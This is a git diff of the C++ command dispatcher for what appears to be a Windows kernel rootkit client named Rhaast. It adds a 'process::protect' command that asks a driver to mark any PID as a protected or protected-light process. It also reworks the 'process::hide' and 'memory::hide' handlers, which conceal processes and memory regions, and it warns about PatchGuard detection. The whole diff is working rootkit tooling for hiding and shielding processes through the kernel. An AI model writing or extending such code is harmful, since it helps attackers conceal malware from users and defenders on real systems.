@@ -174,14 +174,8 @@ BOOL Rhaast::DispatchInput(
         /* convert pid string to int */
         Pid = std::stoi( args[ 1 ].c_str() );
 
-        /* first check if process exists */
-        if ( ! ProcessCheckById( Pid ) ) {
-            spdlog::error( "specified process id does not exists" );
-            FAIL_END
-        }
 
-        /* TODO: check if process exists */
-        if ( ProcessQueryNameById( Pid, &Name ) )
+        if ( ProcessCheckById( Pid, &Name ) )
         {
             /* warn about patch guard detection */
             spdlog::warn( "the technique is known to trigger PatchGuard" );
@@ -204,6 +198,9 @@ BOOL Rhaast::DispatchInput(
                 HeapFree( GetProcessHeap(), 0, Name.Buffer );
                 Name.Buffer = nullptr;
             }
+        } else {
+            spdlog::error( "specified process id does not exists" );
+            FAIL_END
         }
 
     } else if ( args[ 0 ] == "process::unhide" ) {
@@ -231,6 +228,72 @@ BOOL Rhaast::DispatchInput(
             spdlog::error( "failed to unhide process" );
         }
 
+    } else if ( args[ 0 ] == "process::protect" ) {
+
+        RS_C_PROCESS_PROTECTION Protection = { 0 };
+        BUFFER                  Name       = { 0 };
+        BOOL                    Remove     = FALSE;
+        BOOL                    Light      = FALSE;
+
+        /* check if enough args has been specified */
+        ARGS_CHECK_LEN( 1 )
+
+        RtlSecureZeroMemory( &Protection, sizeof( Protection ) );
+
+        if ( ! StringIsNumber( args[ 1 ] ) ) {
+            spdlog::error( "specified argument is not a number" );
+            FAIL_END
+        }
+
+        /* set target process */
+        Protection.Pid = std::stoi( args[ 1 ] );
+
+        /* check if process exists and get name of it.  */
+        if ( ! ProcessCheckById( Protection.Pid, &Name ) ) {
+            spdlog::error( "specified process id does not exists" );
+            FAIL_END
+        }
+
+        for ( int i = 0; i < args.size(); i++ ) {
+            if ( args[ i ] == "--remove" ) {
+                Remove = TRUE;
+                continue;
+            }
+
+            if ( args[ i ] == "--light" ) {
+                Light = TRUE;
+                continue;
+            }
+        }
+
+        if ( ! Remove ) {
+            Protection.SignatureProtection.SignatureLevel        = 0x3f;
+            Protection.SignatureProtection.SectionSignatureLevel = 0x3f;
+            Protection.SignatureProtection.Protection.Type       = Light ? PsProtectedTypeProtectedLight : PsProtectedTypeProtected;
+            Protection.SignatureProtection.Protection.Audit      = 0;
+            Protection.SignatureProtection.Protection.Signer     = 6;
+        }
+
+        spdlog::info( "process protection:" );
+        spdlog::info( " - Pid    : {}", Protection.Pid );
+        spdlog::info( " - Name   : {}", std::string( ( PCHAR ) Name.Buffer ) );
+        spdlog::info( " - Type   : {}", Remove ? "None" : Light ? "Protected Light" : "Protected Full" );
+        spdlog::info( " - Action : {}", Remove ? "Remove" : "Add" );
+
+        /* send command */
+        if ( ( success = NT_SUCCESS( RhaastSend( RHAAST_COMMAND_PROCESS_PROTECT, &Protection, sizeof( Protection ) ) ) ) ) {
+            spdlog::info( "process protection applied" );
+        } else {
+            spdlog::error( "process protection failed to apply" );
+        }
+
+        /* free memory */
+        if ( Name.Buffer ) {
+            RtlSecureZeroMemory( Name.Buffer, Name.Length );
+            HeapFree( GetProcessHeap(), 0, Name.Buffer );
+            Name.Buffer = NULL;
+        }
+
     } else if ( args[ 0 ] == "memory::hide" ) {
 
         RS_C_MEMORY_VAD MemoryVad = { 0 };
@@ -252,10 +315,9 @@ BOOL Rhaast::DispatchInput(
 
         MemoryVad.Pid     = std::stoul( args[ 1 ] );
         MemoryVad.Address = std::stoull( args[ 2 ], nullptr, 16 );
-        MemoryVad.Hide    = TRUE;
 
         /* first check if process exists */
-        if ( ! ProcessCheckById( MemoryVad.Pid ) ) {
+        if ( ! ProcessCheckById( MemoryVad.Pid, NULL ) ) {
             spdlog::error( "specified process id does not exists" );
             FAIL_END
         }
@@ -270,8 +332,6 @@ BOOL Rhaast::DispatchInput(
         } else {
             spdlog::error( "failed to hide memory" );
         }
-
-    } else if ( args[ 0 ] == "memory::unhide" ) {
 
     } else {
 
